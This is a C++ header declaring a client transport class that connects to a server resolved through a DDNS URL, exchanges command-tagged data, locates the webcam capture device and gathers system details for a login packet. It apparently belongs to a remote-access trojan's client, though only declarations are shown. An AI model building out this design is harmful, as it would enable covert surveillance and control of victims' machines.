// MyTrans.h: interface for the CMyTrans class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_MYTRANS_H__B3652F04_7623_4FAB_9914_4B5207B6B8D5__INCLUDED_)
#define AFX_MYTRANS_H__B3652F04_7623_4FAB_9914_4B5207B6B8D5__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000



class CMyClientTran
{
public:
	CMyClientTran();
	virtual ~CMyClientTran();

	PSDLLINFO		m_DllInfo;

private:
	SOCKET			m_Socket;
	BOOL			m_IsProxy;
	TCHAR			m_Addr[MAX_PATH];
	DWORD			m_Port;

public:

	BOOL Create(DWORD nCmd, PSDLLINFO m_Info);
	BOOL Connect(DWORD nCmd, HWND hWnd);
	void Close();
		
	BOOL GetRealServerInfo(LPCTSTR m_DdnsUrl);
	BOOL SendDataWithCmd(LPVOID pSendData, DWORD dSendLen, DWORD nCmd);
	BOOL RecvDataWithCmd(LPBYTE* pRecvData, DWORD* dCmd, DWORD* dRecvLen);
	
	BOOL SendData(LPVOID data, DWORD len);
	BOOL RecvData(LPVOID data, DWORD len);

	BOOL GetDefaultCapDevice(IBaseFilter ** ppCap);

	SOCKET GetSafeSocket();

	Type static IsShellSysType();

private:
	
	SOCKET GetConnectSocket(LPCTSTR pServerAddr, UINT nServerPort);
	void FillMySysInfo(LPLOGININFO pSysInfo, LPPSDLLINFO pInfo);
	int  CPU_Frequency(void);
	char GetVideoInfo();
	
};

#endif // !defined(AFX_MYTRANS_H__B3652F04_7623_4FAB_9914_4B5207B6B8D5__INCLUDED_)
